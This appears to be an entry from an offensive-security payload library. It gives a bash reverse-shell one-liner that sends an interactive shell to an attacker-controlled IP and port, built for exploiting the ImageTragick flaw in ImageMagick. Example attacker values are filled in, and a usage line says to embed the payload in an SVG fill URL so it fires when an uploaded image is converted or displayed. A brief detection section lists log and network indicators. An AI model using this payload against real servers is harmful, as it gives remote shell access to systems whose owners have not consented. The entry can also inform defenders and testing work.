---
id: 205136fb-06a9-4494-82ff-6be57416aa97
type: code
language: bash
verified: true
created_at: '2019-11-04T23:05:24.381392+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
platforms:
  - Linux
tags:
  - reverse-shell
  - payload
validated: true
---

# ImageTragick-Bash-Reverse-Shell

## Code

```bash
bash -i >& /dev/tcp/$_ATTACKER_IP/$_ATTACKER_PORT 0>&1
```

## Description

Bash reverse shell payload tailored for ImageTragick exploitation, executed via image processing.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_ATTACKER_IP | Attacker IP | 10.10.14.1 |
| $_ATTACKER_PORT | Port | 4444 |

## Usage

Embed in SVG fill URL for upload; triggers on convert/display.

## Detection

- Image processing logs with URL schemes
- Unexpected bash invocations from web context
- Network beacons to attacker IP

## Related

- [[procedures/Exploit-ImageMagick-ImageTragick-for-Code-Execution]]
